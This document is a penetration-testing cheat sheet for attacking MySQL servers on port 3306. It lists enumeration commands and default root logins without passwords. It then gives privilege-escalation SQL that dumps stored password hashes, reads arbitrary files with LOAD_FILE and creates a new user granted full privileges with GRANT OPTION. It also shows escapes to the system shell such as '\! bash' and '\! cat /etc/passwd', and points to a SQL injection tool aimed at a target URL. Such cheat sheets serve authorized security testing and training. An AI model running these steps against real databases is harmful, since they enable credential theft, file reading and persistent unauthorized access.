<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
MySQL (Port 3306)

Enumeration
    nmap -A -n -p3306 <IP Address>
    nmap -A -n -PN --script:ALL -p3306 <IP Address>
    telnet IP_Address 3306
    use test; select * from test;
    To check for other DB's -- show databases
Administration
    MySQL Network Scanner
    MySQL GUI Tools
    mysqlshow
    mysqlbinlog
Manual Checks
    Default usernames and passwords
        username: root password:
        testing
            mysql -h <Hostname> -u root
            mysql -h <Hostname> -u root
            mysql -h <Hostname> -u root@localhost
            mysql -h <Hostname>
            mysql -h <Hostname> -u ""@localhost
    Configuration Files
        Operating System
            windows
                config.ini
                my.ini
                    windows\my.ini
                    winnt\my.ini
                <InstDir>/mysql/data/
            unix
                my.cnf
                    /etc/my.cnf
                    /etc/mysql/my.cnf
                    /var/lib/mysql/my.cnf
                    ~/.my.cnf
                    /etc/my.cnf
        Command History
            ~/.mysql.history
        Log Files
            connections.log
            update.log
            common.log
        To run many sql commands at once -- mysql -u username -p < manycommands.sql
        MySQL data directory (Location specified in my.cnf)
            Parent dir = data directory
            mysql
            test
            information_schema (Key information in MySQL)
                Complete table list -- select table_schema,table_name from tables;
                Exact privileges -- select grantee, table_schema, privilege_type FROM schema_privileges;
                File privileges -- select user,file_priv from mysql.user where user='root';
                Version -- select version();
                Load a specific file -- SELECT LOAD_FILE('FILENAME');
        SSL Check
            mysql> show variables like 'have_openssl';
                If there's no rows returned at all it means the the distro itself doesn't support SSL connections and probably needs to be recompiled. If its disabled it means that the service just wasn't started with ssl and can be easily fixed.
    Privilege Escalation
        Current Level of access
            mysql>select user();
            mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
        Access passwords
            mysql> use mysql
            mysql> select user,password from user;
        Create a new user and grant him privileges
            mysql>create user test identified by 'test';
            mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
        Break into a shell
            mysql> \! cat /etc/passwd
            mysql> \! bash
SQL injection
    mysql-miner.pl
        mysql-miner.pl http://target/ expected_string database
    http://www.imperva.com/resources/adc/sql_injection_signatures_evasion.html
    http://www.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/
References.
    Design Weaknesses
        MySQL running as root
        Exposed publicly on Internet
    http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=mysql
    http://search.securityfocus.com/swsearch?sbm=%2F&metaname=alldoc&query=mysql&x=0&y=0
